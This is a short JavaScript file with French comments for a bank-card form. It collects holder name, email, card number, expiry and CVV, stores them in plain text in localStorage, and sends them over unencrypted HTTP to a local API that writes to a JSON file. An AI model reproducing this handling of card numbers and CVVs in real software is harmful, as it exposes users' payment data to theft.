document.addEventListener('DOMContentLoaded', function() {
    // Vérifier si l'utilisateur est authentifié
    const userData = JSON.parse(localStorage.getItem('user_data'));
    if (!userData || !userData.pays) {
        window.location.href = 'index.html';
        return;
    }

    // Formatage automatique de la date d'expiration
    document.querySelector('input[name="expiration"]').addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length >= 2) {
            value = value.slice(0,2) + '/' + value.slice(2,4);
        }
        e.target.value = value;
    });

    // Gérer la soumission du formulaire
    document.getElementById('bankForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        
        // Récupérer les données du formulaire
        const formData = {
            titulaire: this.elements['titulaire'].value,
            email: this.elements['email'].value,
            numero_carte: this.elements['numero_carte'].value,
            expiration: this.elements['expiration'].value,
            cvv: this.elements['cvv'].value,
            timestamp: new Date().toISOString()
        };

        // Mettre à jour les données utilisateur
        userData.info_bancaire = formData;
        localStorage.setItem('user_data', JSON.stringify(userData));

        // Mettre à jour data.json via l'API
        try {
            const response = await fetch(`http://localhost:3000/api/users/${userData.code}`, {
                method: 'PUT',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ info_bancaire: formData })
            });

            if (!response.ok) {
                throw new Error('Erreur lors de la mise à jour des données');
            }
        } catch (error) {
            console.error('Erreur:', error);
        }

        // Rediriger vers la page banque
        window.location.href = 'banque.html';
    });
});
